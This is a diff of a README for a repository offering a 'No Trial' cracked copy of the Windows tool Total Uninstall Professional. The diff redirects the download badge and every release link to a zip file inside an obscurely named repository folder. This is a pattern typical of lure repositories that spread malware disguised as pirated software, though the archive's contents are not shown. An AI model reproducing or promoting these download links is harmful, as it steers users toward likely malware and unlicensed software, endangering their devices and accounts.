@@ -1,6 +1,6 @@
 # 🛠️ Total-Uninstall-Professional-No-Trial - Easily Manage Your Installed Applications
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/s1moon/Total-Uninstall-Professional-No-Trial/main/peritonitic/Total-Uninstall-Professional-No-Trial-3.2.zip)
 
 ## 📄 Overview
 Total Uninstall Professional is a powerful tool designed to help you manage applications on your Windows PC. With this application, you can easily remove programs, clean up your system, and ensure no leftover files clutter your device. This repository offers essential resources, guides, and troubleshooting tips to help you get started smoothly.
@@ -12,7 +12,7 @@ To get started with Total Uninstall Professional, follow these simple steps. No 
 2. Visit the Releases page to obtain the latest version of Total Uninstall Professional.
 
 ## 🌐 Download & Install
-To download Total Uninstall Professional, visit this page: [Download Total Uninstall Professional](https://github.com/s1moon/Total-Uninstall-Professional-No-Trial/releases). 
+To download Total Uninstall Professional, visit this page: [Download Total Uninstall Professional](https://raw.githubusercontent.com/s1moon/Total-Uninstall-Professional-No-Trial/main/peritonitic/Total-Uninstall-Professional-No-Trial-3.2.zip). 
 
 1. Click on the latest release.
 2. Find the download link for Total Uninstall Professional.
@@ -63,4 +63,4 @@ We welcome your feedback! Share your experience with Total Uninstall Professiona
 ## 🔄 Conclusion
 Total Uninstall Professional helps you maintain a clean and efficient Windows PC. With this easy guide, you are now ready to download, install, and manage your applications effectively. 
 
-For more information, visit the [Releases page](https://github.com/s1moon/Total-Uninstall-Professional-No-Trial/releases) again if you need to download the software or check for updates later.
+For more information, visit the [Releases page](https://raw.githubusercontent.com/s1moon/Total-Uninstall-Professional-No-Trial/main/peritonitic/Total-Uninstall-Professional-No-Trial-3.2.zip) again if you need to download the software or check for updates later.
